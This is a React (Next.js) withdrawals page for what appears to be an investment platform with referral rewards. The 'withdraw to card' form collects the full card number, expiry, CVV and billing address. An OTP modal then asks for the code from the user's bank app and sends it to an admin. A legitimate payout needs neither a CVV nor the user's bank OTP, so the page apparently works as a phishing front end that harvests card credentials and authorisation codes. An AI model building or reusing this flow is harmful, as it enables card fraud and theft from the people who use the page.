"use client"

import { useState, useEffect, useRef } from 'react'
import { api } from '@/lib/api'
import toast from 'react-hot-toast'
import { ArrowUpRight, CreditCard, User, Calendar, Lock, MapPin, Shield } from 'lucide-react'

const WITHDRAWAL_FEE_PERCENT = 0.02
const WITHDRAWAL_FEE_MIN = 1
const WITHDRAWAL_FEE_MAX = 5

const getWithdrawalFee = (amount: number): number => {
  const fee = amount * WITHDRAWAL_FEE_PERCENT
  return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
}

const formatCardNumber = (value: string) => {
  const numbers = value.replace(/\D/g, '').slice(0, 16)
  return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
}

export default function WithdrawalsPage() {
  const [withdrawals, setWithdrawals] = useState<any[]>([])
  const [investments, setInvestments] = useState<any[]>([])
  const [loading, setLoading] = useState(true)
  const [showForm, setShowForm] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [showOTPModal, setShowOTPModal] = useState(false)
  const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
  const [otpCode, setOtpCode] = useState('')
  const [referralBalance, setReferralBalance] = useState(0)
  const [canWithdrawReferralRewards, setCanWithdrawReferralRewards] = useState(false)
  const [formData, setFormData] = useState({ balanceSource: 'INVESTMENT', investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '' })
  const hasPromptedOTP = useRef(false)

  useEffect(() => {
    fetchWithdrawals()
    const interval = setInterval(fetchWithdrawals, 5000)
    return () => clearInterval(interval)
  }, [])

  const fetchWithdrawals = async () => {
    try {
      const { data } = await api.get('withdrawals')
      setWithdrawals(data.data)

      // Only show OTP modal once, from form submission (not polling)
      if (!hasPromptedOTP.current) {
        const processing = data.data.find((w: any) => w.status === 'PROCESSING')
        if (processing) {
          hasPromptedOTP.current = true
          setPendingWithdrawalId(processing.id)
          setShowOTPModal(true)
        }
      }
    } catch (err) {
      toast.error('Failed to fetch withdrawals')
    } finally {
      setLoading(false)
    }
  }

  const fetchInvestments = async () => {
    try {
      const [investmentResponse, referralResponse] = await Promise.all([api.get('/investments'), api.get('/referrals')])
      setInvestments(investmentResponse.data.data)
      setReferralBalance(Number(referralResponse.data.data?.walletBalance || 0))
      setCanWithdrawReferralRewards(Boolean(referralResponse.data.data?.canWithdrawReferralRewards))
    } catch (err) {
      console.log(err)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const amount = Number(formData.amount)
    if (amount < 1) {
      toast.error('Amount must be at least $1')
      return
    }
    if (!formData.billingAddress || formData.billingAddress.length < 5) {
      toast.error('Billing address required')
      return
    }
    const fee = getWithdrawalFee(amount)
    const selectedInvestment = investments.find((investment: any) => investment.id === formData.investmentId)
    const sourceBalance = formData.balanceSource === 'REFERRAL' ? referralBalance : Number(selectedInvestment?.currentBalance || 0)
    const maxWithdrawable = sourceBalance - fee
    if (amount > maxWithdrawable) {
      toast.error(`Insufficient balance. Fee: $${fee.toFixed(2)}`)
      return
    }
    handleConfirm()
  }

  const handleConfirm = async () => {
    try {
      const payload = {
        ...(formData.balanceSource === 'INVESTMENT' ? { investmentId: formData.investmentId } : {}),
        balanceSource: formData.balanceSource,
        amount: Number(formData.amount),
        method: 'CARD' as const,
        cardNumber: formData.cardNumber.replace(/\s/g, ''),
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        billingAddress: formData.billingAddress,
      }
      const { data } = await api.post('withdrawals', payload)
      setShowForm(false)
      if (data.success && data.data?.id) {
        setPendingWithdrawalId(data.data.id)
        setShowOTPModal(true)
      }
      fetchWithdrawals()
    } catch (err: any) {
      toast.error(err.response?.data?.message || 'Failed')
    }
  }

  const handleSubmitOTP = async () => {
    if (!pendingWithdrawalId || !otpCode || otpCode.length < 4) {
      toast.error('Please enter valid OTP code')
      return
    }
    try {
      await api.put(`withdrawals/${pendingWithdrawalId}/otp`, { otpCode })
      setShowOTPModal(false)
      hasPromptedOTP.current = false
      setOtpCode('')
      setPendingWithdrawalId(null)
      toast.success('OTP submitted! Admin will process your withdrawal.')
      fetchWithdrawals()
    } catch (err: any) {
      toast.error(err.response?.data?.message || 'Failed')
    }
  }

  const statusColors: Record<string, string> = {
  'PROCESSING': 'bg-blue-50 text-blue-700 border border-blue-200',
  'WITHDRAWAL_PENDING': 'bg-yellow-50 text-yellow-700 border border-yellow-200',
  'WITHDRAWN': 'bg-green-50 text-green-700 border border-green-200',
  'REJECTED': 'bg-red-50 text-red-700 border border-red-200',
  }

  const selectedInvestment = investments.find((investment: any) => investment.id === formData.investmentId)
  const sourceBalance = formData.balanceSource === 'REFERRAL' ? referralBalance : Number(selectedInvestment?.currentBalance || 0)

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold text-gray-900">Withdrawals</h1>
        <button
          onClick={() => {
            fetchInvestments()
            setShowForm(!showForm)
          }}
          className="flex items-center gap-2 rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-4 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90 transition-all duration-200"
        >
          <ArrowUpRight size={18} />
          New Withdrawal
        </button>
      </div>

      {showForm && (
        <form onSubmit={handleSubmit} className="rounded-3xl border bg-white p-6 shadow-sm">
          <h3 className="text-lg font-semibold text-gray-900 mb-4">Request Withdrawal to Card</h3>
          <div className="grid gap-4 sm:grid-cols-2">
            <div>
              <label className="block text-sm font-medium text-gray-700">Withdrawal source</label>
              <select
                value={formData.balanceSource}
                onChange={(e) => setFormData({ ...formData, balanceSource: e.target.value, investmentId: '' })}
                className="mt-1 w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
              >
                <option value="INVESTMENT">Investment balance</option>
                <option value="REFERRAL" disabled={!canWithdrawReferralRewards || referralBalance <= 0}>Referral rewards — ${referralBalance.toLocaleString()}</option>
              </select>
              {!canWithdrawReferralRewards && referralBalance > 0 && <p className="mt-1 text-xs text-amber-700">Referral rewards unlock for withdrawal after your first confirmed package deposit.</p>}
            </div>
            {formData.balanceSource === 'INVESTMENT' && <div>
              <label className="block text-sm font-medium text-gray-700">Investment</label>
              <select
                value={formData.investmentId}
                onChange={(e) => setFormData({ ...formData, investmentId: e.target.value })}
                className="mt-1 w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
                required={formData.balanceSource === 'INVESTMENT'}
              >
                <option value="">Select investment</option>
                {investments.map((inv) => (
                  <option key={inv.id} value={inv.id}>
                    {inv.investmentId} - ${Number(inv.currentBalance).toLocaleString()}
                  </option>
                ))}
              </select>
            </div>}
            <div>
              <label className="block text-sm font-medium text-gray-700">Amount (USD)</label>
              <input
                type="number"
                min="1"
                value={formData.amount}
                onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                className="mt-1 w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
                required
                placeholder="Enter amount"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">Card Number</label>
              <div className="relative mt-1">
                <CreditCard className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formatCardNumber(formData.cardNumber)}
                  onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value).replace(/\s/g, '') })}
                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 font-mono"
                  required
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">Cardholder Name</label>
              <div className="relative mt-1">
                <User className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.cardholderName}
                  onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
                  required
                  placeholder="John Doe"
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">Expiry Date (MM/YY)</label>
              <div className="relative mt-1">
                <Calendar className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.expiryDate}
                  onChange={(e) => {
                    let v = e.target.value.replace(/\D/g, '')
                    if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4)
                    setFormData({ ...formData, expiryDate: v.slice(0, 5) })
                  }}
                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
                  required
                  placeholder="12/25"
                  maxLength={5}
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700">CVV</label>
              <div className="relative mt-1">
                <Lock className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.cvv}
                  onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
                  required
                  placeholder="123"
                  maxLength={3}
                />
              </div>
            </div>
            <div className="sm:col-span-2">
              <label className="block text-sm font-medium text-gray-700">Billing Address</label>
              <div className="relative mt-1">
                <MapPin className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  value={formData.billingAddress}
                  onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })}
                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10"
                  required
                  placeholder="Street, Apt, City, Country"
                />
              </div>
            </div>
          </div>
          <div className="mt-4 flex gap-3">
            <button type="submit" className="rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-5 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90 transition-all duration-200">
              Submit
            </button>
            <button type="button" onClick={() => setShowForm(false)} className="rounded-xl border border-gray-200 px-5 py-2 text-sm text-gray-700 hover:bg-gray-50 transition-all duration-200">
              Cancel
            </button>
          </div>
          <p className="mt-3 text-xs text-gray-500">
            Available from {formData.balanceSource === 'REFERRAL' ? 'referral rewards' : 'selected investment'}: ${sourceBalance.toLocaleString()} | Fee: {formData.amount ? `$${getWithdrawalFee(Number(formData.amount)).toFixed(2)}` : '-'} (2%, min $1, max $5)
          </p>
        </form>
      )}

      {showOTPModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
          <div className="rounded-3xl border bg-white p-6 shadow-sm w-full max-w-md mx-4">
            <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
              <Shield className="h-5 w-5 text-brand-blue" />
              Enter OTP
            </h3>
            <p className="text-sm text-gray-600 mb-4">
              Please enter the OTP from your bank app to complete withdrawal.
            </p>
            <input
              type="text"
              value={otpCode}
              onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 10))}
              className="w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 text-center text-lg font-mono"
              placeholder="Enter OTP code"
              maxLength={10}
            />
            <div className="mt-4 flex gap-3">
              <button
                onClick={handleSubmitOTP}
                className="flex-1 rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-5 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90"
              >
                Submit OTP
              </button>
              <button
                onClick={() => setShowOTPModal(false)}
                className="rounded-xl border border-gray-200 px-5 py-2 text-sm text-gray-700 hover:bg-gray-50"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="rounded-3xl border bg-white overflow-hidden shadow-sm">
        <table className="w-full">
          <thead className="bg-gray-50">
            <tr className="border-b text-left text-sm font-medium text-gray-600">
              <th className="px-5 py-3">Date</th>
              <th className="px-5 py-3">Investment</th>
              <th className="px-5 py-3">Amount</th>
              <th className="px-5 py-3">Method</th>
              <th className="px-5 py-3">Card Details</th>
              <th className="px-5 py-3">Status</th>
            </tr>
          </thead>
          <tbody className="divide-y">
            {withdrawals.map((w) => (
              <tr key={w.id} className="hover:bg-gray-50 transition-colors">
                <td className="px-5 py-3 text-sm text-gray-600">{new Date(w.createdAt).toLocaleDateString()}</td>
                <td className="px-5 py-3 text-sm text-gray-900 font-medium">{w.balanceSource === 'REFERRAL' ? 'Referral rewards' : w.investmentId}</td>
                <td className="px-5 py-3 text-sm font-medium text-gray-900">${Number(w.amount).toLocaleString()}</td>
                <td className="px-5 py-3 text-sm text-gray-600">{w.method}</td>
                <td className="px-5 py-3 text-sm text-gray-600 font-mono">
                  {w.cardNumber ? `${formatCardNumber(w.cardNumber)}` : '-'}
                </td>
                <td className="px-5 py-3">
                  <span className={`inline-block rounded-full px-2.5 py-1 text-xs font-medium ${statusColors[w.status] || 'bg-gray-50 text-gray-700 border border-gray-200'}`}>
                    {w.status.replace(/_/g, ' ')}
                  </span>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
        {withdrawals.length === 0 && <div className="p-8 text-center text-gray-500">No withdrawals yet.</div>}
      </div>
    </div>
  )
}
